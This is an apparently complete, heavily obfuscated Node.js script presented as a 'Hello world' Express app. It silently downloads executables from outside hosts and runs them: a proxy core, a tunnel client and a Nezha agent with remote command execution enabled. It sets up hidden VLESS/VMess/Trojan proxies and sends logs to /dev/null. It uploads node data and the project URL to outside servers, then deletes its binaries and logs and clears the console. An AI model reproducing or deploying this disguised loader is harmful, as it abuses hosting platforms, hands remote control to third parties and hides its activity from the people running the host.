function _0x335b(_0x35a5a7,_0x38adfc){_0x35a5a7=_0x35a5a7-0x82;const _0x386873=_0x3868();let _0x335b03=_0x386873[_0x35a5a7];return _0x335b03;}const _0x22b80d=_0x335b;(function(_0x554f17,_0x38a5d5){const _0x150a3b=_0x335b,_0x553ce3=_0x554f17();while(!![]){try{const _0xdee71e=parseInt(_0x150a3b(0xdb))/0x1+parseInt(_0x150a3b(0xb0))/0x2+-parseInt(_0x150a3b(0xd2))/0x3*(-parseInt(_0x150a3b(0xc7))/0x4)+parseInt(_0x150a3b(0xd8))/0x5+-parseInt(_0x150a3b(0xbb))/0x6+parseInt(_0x150a3b(0xa1))/0x7+-parseInt(_0x150a3b(0x117))/0x8;if(_0xdee71e===_0x38a5d5)break;else _0x553ce3['push'](_0x553ce3['shift']());}catch(_0x36d4d4){_0x553ce3['push'](_0x553ce3['shift']());}}}(_0x3868,0x379aa));const express=require('express'),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x22b80d(0xed)),{promisify}=require('util'),exec=promisify(require(_0x22b80d(0xba))['exec']),{execSync}=require(_0x22b80d(0xba)),UPLOAD_URL=process[_0x22b80d(0x12e)][_0x22b80d(0x12a)]||'',PROJECT_URL=process[_0x22b80d(0x12e)][_0x22b80d(0x130)]||'',AUTO_ACCESS=process['env'][_0x22b80d(0x112)]||![],FILE_PATH=process[_0x22b80d(0x12e)][_0x22b80d(0xe3)]||_0x22b80d(0xde),SUB_PATH=process[_0x22b80d(0x12e)][_0x22b80d(0xbe)]||_0x22b80d(0x100),PORT=process['env'][_0x22b80d(0xf2)]||process[_0x22b80d(0x12e)][_0x22b80d(0x108)]||0xbb8,UUID=process[_0x22b80d(0x12e)]['UUID']||_0x22b80d(0x124),NEZHA_SERVER=process['env'][_0x22b80d(0xef)]||'',NEZHA_PORT=process[_0x22b80d(0x12e)][_0x22b80d(0xea)]||'',NEZHA_KEY=process['env']['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x22b80d(0x12e)]['ARGO_DOMAIN']||_0x22b80d(0xad),ARGO_AUTH=process[_0x22b80d(0x12e)][_0x22b80d(0x111)]||'eyJhIjoiODM2MTAwMjFlOTIwZmIwYWU2OGE3YWFmNWI2ZjkyOTEiLCJ0IjoiMmFhMTA3ZGEtYjM5YS00NDdkLWEwYjItMmZmM2FlZTNmOTNlIiwicyI6Ik1ERTFZVFZsWXpJdE16aGxPQzAwTlRRd0xXRTVNall0TkdFMllXTm1PV1V4TlRNeSJ9',ARGO_PORT=process['env'][_0x22b80d(0x106)]||0x1f41,CFIP=process[_0x22b80d(0x12e)]['CFIP']||_0x22b80d(0xab),CFPORT=process['env'][_0x22b80d(0x94)]||0x1bb,NAME=process[_0x22b80d(0x12e)][_0x22b80d(0x116)]||_0x22b80d(0x93);!fs[_0x22b80d(0x11e)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x22b80d(0x8b)](FILE_PATH+_0x22b80d(0xf4))):console[_0x22b80d(0x8b)](FILE_PATH+_0x22b80d(0xdf));function generateRandomName(){const _0x608f21=_0x22b80d,_0x491b56=_0x608f21(0xec);let _0x206370='';for(let _0x54a0f8=0x0;_0x54a0f8<0x6;_0x54a0f8++){_0x206370+=_0x491b56[_0x608f21(0x10e)](Math['floor'](Math['random']()*_0x491b56[_0x608f21(0x139)]));}return _0x206370;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x22b80d(0x123)](FILE_PATH,npmName),phpPath=path[_0x22b80d(0x123)](FILE_PATH,phpName),webPath=path[_0x22b80d(0x123)](FILE_PATH,webName),botPath=path[_0x22b80d(0x123)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x22b80d(0xbf)),listPath=path[_0x22b80d(0x123)](FILE_PATH,_0x22b80d(0x133)),bootLogPath=path[_0x22b80d(0x123)](FILE_PATH,_0x22b80d(0x12c)),configPath=path[_0x22b80d(0x123)](FILE_PATH,_0x22b80d(0xe8));function deleteNodes(){const _0x5ac8d8=_0x22b80d;try{if(!UPLOAD_URL)return;if(!fs[_0x5ac8d8(0x11e)](subPath))return;let _0xedc83;try{_0xedc83=fs['readFileSync'](subPath,'utf-8');}catch{return null;}const _0x1f0d0c=Buffer['from'](_0xedc83,_0x5ac8d8(0x10d))[_0x5ac8d8(0x82)](_0x5ac8d8(0x143)),_0x26cac5=_0x1f0d0c[_0x5ac8d8(0xac)]('\x0a')[_0x5ac8d8(0x10f)](_0x5b83d8=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5ac8d8(0x107)](_0x5b83d8));if(_0x26cac5[_0x5ac8d8(0x139)]===0x0)return;return axios['post'](UPLOAD_URL+'/api/delete-nodes',JSON['stringify']({'nodes':_0x26cac5}),{'headers':{'Content-Type':_0x5ac8d8(0xeb)}})['catch'](_0x4b32bc=>{return null;}),null;}catch(_0x2ab279){return null;}}function cleanupOldFiles(){const _0x58e0a9=_0x22b80d;try{const _0x4b7df1=fs[_0x58e0a9(0xe5)](FILE_PATH);_0x4b7df1[_0x58e0a9(0xe1)](_0x5a5abd=>{const _0x3aeb2a=_0x58e0a9,_0x50d44b=path['join'](FILE_PATH,_0x5a5abd);try{const _0x2442bd=fs[_0x3aeb2a(0x9a)](_0x50d44b);_0x2442bd[_0x3aeb2a(0x96)]()&&fs[_0x3aeb2a(0xe2)](_0x50d44b);}catch(_0x138e8f){}});}catch(_0x5935aa){}}app['get']('/',function(_0x110e70,_0x300d64){const _0x275cf5=_0x22b80d;_0x300d64[_0x275cf5(0xaa)]('Hello\x20world!');});async function generateConfig(){const _0x1e99af=_0x22b80d,_0x2e59a8={'log':{'access':'/dev/null','error':'/dev/null','loglevel':_0x1e99af(0x120)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x1e99af(0x83),'settings':{'clients':[{'id':UUID,'flow':_0x1e99af(0xf8)}],'decryption':_0x1e99af(0x120),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x1e99af(0xb4),'dest':0xbbb},{'path':_0x1e99af(0xa5),'dest':0xbbc}]},'streamSettings':{'network':_0x1e99af(0x84)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x1e99af(0x83),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x1e99af(0x84),'security':'none'}},{'port':0xbba,'listen':_0x1e99af(0xaf),'protocol':_0x1e99af(0x83),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x1e99af(0x120)},'streamSettings':{'network':'ws','security':_0x1e99af(0x120),'wsSettings':{'path':_0x1e99af(0xe4)}},'sniffing':{'enabled':!![],'destOverride':[_0x1e99af(0x8f),_0x1e99af(0x104),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x1e99af(0xaf),'protocol':_0x1e99af(0x132),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x1e99af(0x8f),_0x1e99af(0x104),_0x1e99af(0xff)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x1e99af(0xaf),'protocol':_0x1e99af(0x141),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x1e99af(0x8f),_0x1e99af(0x104),_0x1e99af(0xff)],'metadataOnly':![]}}],'dns':{'servers':[_0x1e99af(0x10c)]},'outbounds':[{'protocol':_0x1e99af(0xdd),'tag':_0x1e99af(0xf7)},{'protocol':_0x1e99af(0xdc),'tag':'block'}]};fs[_0x1e99af(0x118)](path['join'](FILE_PATH,_0x1e99af(0xe8)),JSON[_0x1e99af(0x9e)](_0x2e59a8,null,0x2));}function getSystemArchitecture(){const _0x293801=_0x22b80d,_0x56c672=os[_0x293801(0x87)]();return _0x56c672==='arm'||_0x56c672==='arm64'||_0x56c672===_0x293801(0x85)?_0x293801(0x88):_0x293801(0x131);}function downloadFile(_0x5e16e2,_0x4be445,_0x32baf8){const _0x4e19a1=_0x22b80d,_0x59b79f=_0x5e16e2;!fs['existsSync'](FILE_PATH)&&fs[_0x4e19a1(0xf5)](FILE_PATH,{'recursive':!![]});const _0x328dc2=fs['createWriteStream'](_0x59b79f);axios({'method':_0x4e19a1(0xf1),'url':_0x4be445,'responseType':_0x4e19a1(0x142)})[_0x4e19a1(0x9c)](_0x505163=>{const _0x169f96=_0x4e19a1;_0x505163[_0x169f96(0xc1)][_0x169f96(0xfe)](_0x328dc2),_0x328dc2['on'](_0x169f96(0xd6),()=>{const _0x5c41c3=_0x169f96;_0x328dc2[_0x5c41c3(0xa2)](),console[_0x5c41c3(0x8b)](_0x5c41c3(0xee)+path[_0x5c41c3(0xd5)](_0x59b79f)+_0x5c41c3(0xfb)),_0x32baf8(null,_0x59b79f);}),_0x328dc2['on']('error',_0x115afd=>{const _0x1a86c7=_0x169f96;fs['unlink'](_0x59b79f,()=>{});const _0x2b7de4=_0x1a86c7(0xee)+path['basename'](_0x59b79f)+_0x1a86c7(0x105)+_0x115afd[_0x1a86c7(0xe7)];console[_0x1a86c7(0x11a)](_0x2b7de4),_0x32baf8(_0x2b7de4);});})[_0x4e19a1(0x11c)](_0x4682a6=>{const _0x4ccf58=_0x4e19a1,_0x18ee63=_0x4ccf58(0xee)+path[_0x4ccf58(0xd5)](_0x59b79f)+_0x4ccf58(0x105)+_0x4682a6[_0x4ccf58(0xe7)];console[_0x4ccf58(0x11a)](_0x18ee63),_0x32baf8(_0x18ee63);});}async function downloadFilesAndRun(){const _0x376175=_0x22b80d,_0x5865f3=getSystemArchitecture(),_0x30b44d=getFilesForArchitecture(_0x5865f3);if(_0x30b44d[_0x376175(0x139)]===0x0){console['log'](_0x376175(0xfa));return;}const _0x219c17=_0x30b44d['map'](_0x582de7=>{return new Promise((_0x17186b,_0x53ced6)=>{const _0x2e05d8=_0x335b;downloadFile(_0x582de7[_0x2e05d8(0x8d)],_0x582de7[_0x2e05d8(0x13a)],(_0x158784,_0x750dc)=>{_0x158784?_0x53ced6(_0x158784):_0x17186b(_0x750dc);});});});try{await Promise['all'](_0x219c17);}catch(_0x1f918d){console['error'](_0x376175(0x113),_0x1f918d);return;}function _0x586f27(_0x464008){const _0x1218ba=_0x376175,_0x1b3440=0x1fd;_0x464008[_0x1218ba(0xe1)](_0x3f9b10=>{const _0xf2ea43=_0x1218ba;fs['existsSync'](_0x3f9b10)&&fs[_0xf2ea43(0x13d)](_0x3f9b10,_0x1b3440,_0x18a3ef=>{const _0x1f4beb=_0xf2ea43;_0x18a3ef?console[_0x1f4beb(0x11a)](_0x1f4beb(0xa7)+_0x3f9b10+':\x20'+_0x18a3ef):console[_0x1f4beb(0x8b)](_0x1f4beb(0x10a)+_0x3f9b10+':\x20'+_0x1b3440[_0x1f4beb(0x82)](0x8));});});}const _0x2d2892=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x586f27(_0x2d2892);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x202bd0=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x376175(0xac)](':')[_0x376175(0x12d)]():'',_0xf19a00=new Set([_0x376175(0x90),_0x376175(0x101),_0x376175(0x144),_0x376175(0xc8),_0x376175(0x11f),_0x376175(0x129)]),_0x5d2569=_0xf19a00[_0x376175(0xa6)](_0x202bd0)?'true':_0x376175(0x92),_0x1e404b=_0x376175(0xa8)+NEZHA_KEY+_0x376175(0x95)+NEZHA_SERVER+_0x376175(0x9b)+_0x5d2569+_0x376175(0xb5)+UUID;fs['writeFileSync'](path[_0x376175(0x123)](FILE_PATH,_0x376175(0xcd)),_0x1e404b);const _0x593dac=_0x376175(0xd9)+phpPath+_0x376175(0x109)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x593dac),console['log'](phpName+_0x376175(0x13c)),await new Promise(_0x219cf8=>setTimeout(_0x219cf8,0x3e8));}catch(_0x18910b){console[_0x376175(0x11a)](_0x376175(0xb7)+_0x18910b);}}else{let _0x398b0e='';const _0x2b70a7=[_0x376175(0x90),'8443',_0x376175(0x144),'2087','2083',_0x376175(0x129)];_0x2b70a7[_0x376175(0xf6)](NEZHA_PORT)&&(_0x398b0e=_0x376175(0x11b));const _0x578dcd=_0x376175(0xd9)+npmPath+_0x376175(0xe9)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x398b0e+_0x376175(0x9d);try{await exec(_0x578dcd),console[_0x376175(0x8b)](npmName+'\x20is\x20running'),await new Promise(_0x4bb79f=>setTimeout(_0x4bb79f,0x3e8));}catch(_0x299c1a){console[_0x376175(0x11a)](_0x376175(0xbd)+_0x299c1a);}}}else console[_0x376175(0x8b)](_0x376175(0x99));const _0x163548=_0x376175(0xd9)+webPath+_0x376175(0x126)+FILE_PATH+_0x376175(0xe0);try{await exec(_0x163548),console[_0x376175(0x8b)](webName+_0x376175(0x13c)),await new Promise(_0x440015=>setTimeout(_0x440015,0x3e8));}catch(_0x2e0e51){console[_0x376175(0x11a)]('web\x20running\x20error:\x20'+_0x2e0e51);}if(fs[_0x376175(0x11e)](botPath)){let _0x2d059e;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x2d059e=_0x376175(0x10b)+ARGO_AUTH;else ARGO_AUTH[_0x376175(0xa3)](/TunnelSecret/)?_0x2d059e=_0x376175(0x135)+FILE_PATH+_0x376175(0x98):_0x2d059e=_0x376175(0xfd)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x376175(0xd9)+botPath+'\x20'+_0x2d059e+_0x376175(0x13e)),console['log'](botName+_0x376175(0x13c)),await new Promise(_0x1b04c5=>setTimeout(_0x1b04c5,0x7d0));}catch(_0x222f4b){console[_0x376175(0x11a)](_0x376175(0x12f)+_0x222f4b);}}await new Promise(_0x215ef7=>setTimeout(_0x215ef7,0x1388));}function getFilesForArchitecture(_0x30e268){const _0x165d22=_0x22b80d;let _0x277c90;_0x30e268===_0x165d22(0x88)?_0x277c90=[{'fileName':webPath,'fileUrl':_0x165d22(0x138)},{'fileName':botPath,'fileUrl':_0x165d22(0xae)}]:_0x277c90=[{'fileName':webPath,'fileUrl':_0x165d22(0xcc)},{'fileName':botPath,'fileUrl':_0x165d22(0xc6)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x42e3e9=_0x30e268==='arm'?'https://arm64.ssss.nyc.mn/agent':_0x165d22(0x103);_0x277c90[_0x165d22(0xc2)]({'fileName':npmPath,'fileUrl':_0x42e3e9});}else{const _0x2fa134=_0x30e268===_0x165d22(0x88)?_0x165d22(0xca):_0x165d22(0x127);_0x277c90[_0x165d22(0xc2)]({'fileName':phpPath,'fileUrl':_0x2fa134});}}return _0x277c90;}function _0x3868(){const _0x5d588f=['abcdefghijklmnopqrstuvwxyz','path','Download\x20','NEZHA_SERVER','del\x20/f\x20/q\x20','get','SERVER_PORT','\x0a\x20\x20\x20\x20','\x20is\x20created','mkdirSync','includes','direct','xtls-rprx-vision','from','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','\x20successfully','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','pipe','quic','sub','8443','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','https://amd64.ssss.nyc.mn/agent','tls','\x20failed:\x20','ARGO_PORT','test','PORT','\x20-c\x20\x22','Empowerment\x20success\x20for\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','https+local://8.8.8.8/dns-query','base64','charAt','filter','Error\x20reading\x20boot.log:','ARGO_AUTH','AUTO_ACCESS','Error\x20downloading\x20files:','Skipping\x20adding\x20automatic\x20access\x20task','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','NAME','10006984MZnZlZ','writeFileSync','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','error','--tls','catch','\x0a\x20\x20tunnel:\x20','existsSync','2083','none','?security=tls&sni=','response','join','888864b5-ec55-40cf-9250-a3a5d6c65bfe','http\x20server\x20is\x20running\x20on\x20port:','\x20-c\x20','https://amd64.ssss.nyc.mn/v1','Unhandled\x20error\x20in\x20startserver:','2053','UPLOAD_URL','org','boot.log','pop','env','Error\x20executing\x20command:\x20','PROJECT_URL','amd','vmess','list.txt','\x0a\x0atrojan://','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','firefox','&path=%2Fvless-argo%3Fed%3D2560#','https://arm64.ssss.nyc.mn/web','length','fileUrl','tunnel.yml','\x20is\x20running','chmod','\x20>/dev/null\x202>&1\x20&','win32','https://oooo.serv00.net/add-url','trojan','stream','utf-8','2096','toString','vless','tcp','aarch64','Error\x20in\x20startserver:','arch','arm','post','readFileSync','log','taskkill\x20/f\x20/im\x20','fileName','\x20>/dev/null\x202>&1','http','443','push','false','skyjoin','CFPORT','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','isFile','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','/tunnel.yml\x20run','NEZHA\x20variable\x20is\x20empty,skip\x20running','statSync','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','then','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','stringify','Subscription\x20uploaded\x20successfully','country_code','2074219Khpiuc','close','match','&path=%2Ftrojan-argo%3Fed%3D2560#','/trojan-argo','has','Empowerment\x20failed\x20for\x20','\x0aclient_secret:\x20','status','send','cdns.doon.eu.org','split','static980.skyjoin.dpdns.org','https://arm64.ssss.nyc.mn/bot','127.0.0.1','370774ojRWpI','clear','\x0a\x0avmess://','automatic\x20access\x20task\x20added\x20successfully','/vmess-argo','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','countryCode','php\x20running\x20error:\x20','&fp=firefox&type=ws&host=','text/plain;\x20charset=utf-8','child_process','86556NDJPSO','/api/add-subscriptions','npm\x20running\x20error:\x20','SUB_PATH','sub.txt','Content-Type','data','unshift','listen','Nodes\x20uploaded\x20successfully','.exe\x20>\x20nul\x202>&1','https://amd64.ssss.nyc.mn/bot','8JhrwBc','2087','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','https://arm64.ssss.nyc.mn/v1','/api/add-nodes','https://amd64.ssss.nyc.mn/web','config.yaml','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','set','ArgoDomain:','https://ipapi.co/json/','336999frMrvw','pkill\x20-f\x20\x22[','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','basename','finish','/sub.txt\x20saved\x20successfully','1710440RmgXYZ','nohup\x20','success','444595EAdrlP','blackhole','freedom','./tmp','\x20already\x20exists','/config.json\x20>/dev/null\x202>&1\x20&','forEach','unlinkSync','FILE_PATH','/vless-argo','readdirSync','\x22\x20>\x20/dev/null\x202>&1','message','config.json','\x20-s\x20','NEZHA_PORT','application/json'];_0x3868=function(){return _0x5d588f;};return _0x3868();}function argoType(){const _0x4e11de=_0x22b80d;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x4e11de(0x8b)](_0x4e11de(0x115));return;}if(ARGO_AUTH[_0x4e11de(0xf6)]('TunnelSecret')){fs[_0x4e11de(0x118)](path[_0x4e11de(0x123)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x3c5496=_0x4e11de(0x11d)+ARGO_AUTH[_0x4e11de(0xac)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path['join'](FILE_PATH,'tunnel.json')+_0x4e11de(0x97)+ARGO_DOMAIN+_0x4e11de(0x102)+ARGO_PORT+_0x4e11de(0xc9);fs[_0x4e11de(0x118)](path[_0x4e11de(0x123)](FILE_PATH,_0x4e11de(0x13b)),_0x3c5496);}else console[_0x4e11de(0x8b)](_0x4e11de(0xce));}async function extractDomains(){const _0x3d2832=_0x22b80d;let _0x36c280;if(ARGO_AUTH&&ARGO_DOMAIN)_0x36c280=ARGO_DOMAIN,console[_0x3d2832(0x8b)]('ARGO_DOMAIN:',_0x36c280),await _0x584748(_0x36c280);else try{const _0x52c266=fs[_0x3d2832(0x8a)](path[_0x3d2832(0x123)](FILE_PATH,_0x3d2832(0x12c)),_0x3d2832(0x143)),_0x5202c3=_0x52c266[_0x3d2832(0xac)]('\x0a'),_0xb6ad3f=[];_0x5202c3[_0x3d2832(0xe1)](_0xd09610=>{const _0x5130d6=_0x3d2832,_0x25ab19=_0xd09610['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x25ab19){const _0x4366e9=_0x25ab19[0x1];_0xb6ad3f[_0x5130d6(0x91)](_0x4366e9);}});if(_0xb6ad3f[_0x3d2832(0x139)]>0x0)_0x36c280=_0xb6ad3f[0x0],console[_0x3d2832(0x8b)](_0x3d2832(0xd0),_0x36c280),await _0x584748(_0x36c280);else{console['log'](_0x3d2832(0x119)),fs[_0x3d2832(0xe2)](path['join'](FILE_PATH,_0x3d2832(0x12c)));async function _0x3a19a2(){const _0x5954cd=_0x3d2832;try{process['platform']===_0x5954cd(0x13f)?await exec(_0x5954cd(0x8c)+botName+_0x5954cd(0xc5)):await exec(_0x5954cd(0xd3)+botName[_0x5954cd(0x10e)](0x0)+']'+botName['substring'](0x1)+_0x5954cd(0xe6));}catch(_0x4c2d3e){}}_0x3a19a2(),await new Promise(_0x343427=>setTimeout(_0x343427,0xbb8));const _0x587714=_0x3d2832(0xfd)+FILE_PATH+_0x3d2832(0xfc)+ARGO_PORT;try{await exec(_0x3d2832(0xd9)+botPath+'\x20'+_0x587714+_0x3d2832(0x13e)),console[_0x3d2832(0x8b)](botName+_0x3d2832(0x13c)),await new Promise(_0x43ebae=>setTimeout(_0x43ebae,0xbb8)),await extractDomains();}catch(_0x2006ab){console[_0x3d2832(0x11a)](_0x3d2832(0x12f)+_0x2006ab);}}}catch(_0x4ff28b){console['error'](_0x3d2832(0x110),_0x4ff28b);}async function _0x23b1c9(){const _0x1f14e3=_0x3d2832;try{const _0xcb273e=await axios[_0x1f14e3(0xf1)](_0x1f14e3(0xd1),{'timeout':0xbb8});if(_0xcb273e['data']&&_0xcb273e['data'][_0x1f14e3(0xa0)]&&_0xcb273e[_0x1f14e3(0xc1)]['org'])return _0xcb273e[_0x1f14e3(0xc1)][_0x1f14e3(0xa0)]+'_'+_0xcb273e[_0x1f14e3(0xc1)]['org'];}catch(_0x261987){try{const _0xe17111=await axios[_0x1f14e3(0xf1)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0xe17111[_0x1f14e3(0xc1)]&&_0xe17111[_0x1f14e3(0xc1)]['status']===_0x1f14e3(0xda)&&_0xe17111[_0x1f14e3(0xc1)][_0x1f14e3(0xb6)]&&_0xe17111['data']['org'])return _0xe17111[_0x1f14e3(0xc1)]['countryCode']+'_'+_0xe17111[_0x1f14e3(0xc1)][_0x1f14e3(0x12b)];}catch(_0x393a18){}}return'Unknown';}async function _0x584748(_0x526c3e){const _0x19bd4d=await _0x23b1c9(),_0x71dff1=NAME?NAME+'-'+_0x19bd4d:_0x19bd4d;return new Promise(_0x3e8638=>{setTimeout(()=>{const _0x238ce9=_0x335b,_0x1c9fda={'v':'2','ps':''+_0x71dff1,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x238ce9(0x120),'net':'ws','type':'none','host':_0x526c3e,'path':'/vmess-argo?ed=2560','tls':_0x238ce9(0x104),'sni':_0x526c3e,'alpn':'','fp':_0x238ce9(0x136)},_0x7e8815='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x526c3e+_0x238ce9(0xb8)+_0x526c3e+_0x238ce9(0x137)+_0x71dff1+_0x238ce9(0xb2)+Buffer[_0x238ce9(0xf9)](JSON['stringify'](_0x1c9fda))[_0x238ce9(0x82)](_0x238ce9(0x10d))+_0x238ce9(0x134)+UUID+'@'+CFIP+':'+CFPORT+_0x238ce9(0x121)+_0x526c3e+_0x238ce9(0xb8)+_0x526c3e+_0x238ce9(0xa4)+_0x71dff1+_0x238ce9(0xf3);console[_0x238ce9(0x8b)](Buffer[_0x238ce9(0xf9)](_0x7e8815)[_0x238ce9(0x82)](_0x238ce9(0x10d))),fs[_0x238ce9(0x118)](subPath,Buffer['from'](_0x7e8815)[_0x238ce9(0x82)](_0x238ce9(0x10d))),console[_0x238ce9(0x8b)](FILE_PATH+_0x238ce9(0xd7)),uploadNodes(),app[_0x238ce9(0xf1)]('/'+SUB_PATH,(_0x5bf563,_0x15123e)=>{const _0x23f6eb=_0x238ce9,_0x477d11=Buffer[_0x23f6eb(0xf9)](_0x7e8815)[_0x23f6eb(0x82)]('base64');_0x15123e[_0x23f6eb(0xcf)](_0x23f6eb(0xc0),_0x23f6eb(0xb9)),_0x15123e[_0x23f6eb(0xaa)](_0x477d11);}),_0x3e8638(_0x7e8815);},0x7d0);});}}async function uploadNodes(){const _0x5407ab=_0x22b80d;if(UPLOAD_URL&&PROJECT_URL){const _0x5aaf59=PROJECT_URL+'/'+SUB_PATH,_0x3cdac5={'subscription':[_0x5aaf59]};try{const _0x1067e6=await axios[_0x5407ab(0x89)](UPLOAD_URL+_0x5407ab(0xbc),_0x3cdac5,{'headers':{'Content-Type':_0x5407ab(0xeb)}});return _0x1067e6&&_0x1067e6[_0x5407ab(0xa9)]===0xc8?(console[_0x5407ab(0x8b)](_0x5407ab(0x9f)),_0x1067e6):null;}catch(_0x196f67){if(_0x196f67['response']){if(_0x196f67[_0x5407ab(0x122)][_0x5407ab(0xa9)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0xcc50f9=fs[_0x5407ab(0x8a)](listPath,'utf-8'),_0x2a0fd5=_0xcc50f9[_0x5407ab(0xac)]('\x0a')[_0x5407ab(0x10f)](_0x3206da=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5407ab(0x107)](_0x3206da));if(_0x2a0fd5['length']===0x0)return;const _0x2ddb8d=JSON['stringify']({'nodes':_0x2a0fd5});try{const _0x27a3e4=await axios[_0x5407ab(0x89)](UPLOAD_URL+_0x5407ab(0xcb),_0x2ddb8d,{'headers':{'Content-Type':_0x5407ab(0xeb)}});return _0x27a3e4&&_0x27a3e4[_0x5407ab(0xa9)]===0xc8?(console['log'](_0x5407ab(0xc4)),_0x27a3e4):null;}catch(_0x24fab0){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x2b7060=_0x335b,_0x253776=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x253776[_0x2b7060(0x91)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x253776[_0x2b7060(0x91)](phpPath);process['platform']===_0x2b7060(0x13f)?exec(_0x2b7060(0xf0)+_0x253776[_0x2b7060(0x123)]('\x20')+'\x20>\x20nul\x202>&1',_0x5e9fd6=>{const _0x2059af=_0x2b7060;console['clear'](),console['log']('App\x20is\x20running'),console['log'](_0x2059af(0xd4));}):exec('rm\x20-rf\x20'+_0x253776[_0x2b7060(0x123)]('\x20')+_0x2b7060(0x8e),_0x263c6a=>{const _0x57e3ba=_0x2b7060;console[_0x57e3ba(0xb1)](),console['log']('App\x20is\x20running'),console[_0x57e3ba(0x8b)](_0x57e3ba(0xd4));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x569687=_0x22b80d;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x569687(0x8b)](_0x569687(0x114));return;}try{const _0x248281=await axios[_0x569687(0x89)](_0x569687(0x140),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x569687(0xeb)}});return console[_0x569687(0x8b)](_0x569687(0xb3)),_0x248281;}catch(_0x49242a){return console[_0x569687(0x11a)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x49242a['message']),null;}}async function startserver(){const _0x20db2b=_0x22b80d;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x6b1804){console[_0x20db2b(0x11a)](_0x20db2b(0x86),_0x6b1804);}}startserver()['catch'](_0x53164e=>{const _0x256bfc=_0x22b80d;console['error'](_0x256bfc(0x128),_0x53164e);}),app[_0x22b80d(0xc3)](PORT,()=>console['log'](_0x22b80d(0x125)+PORT+'!'));
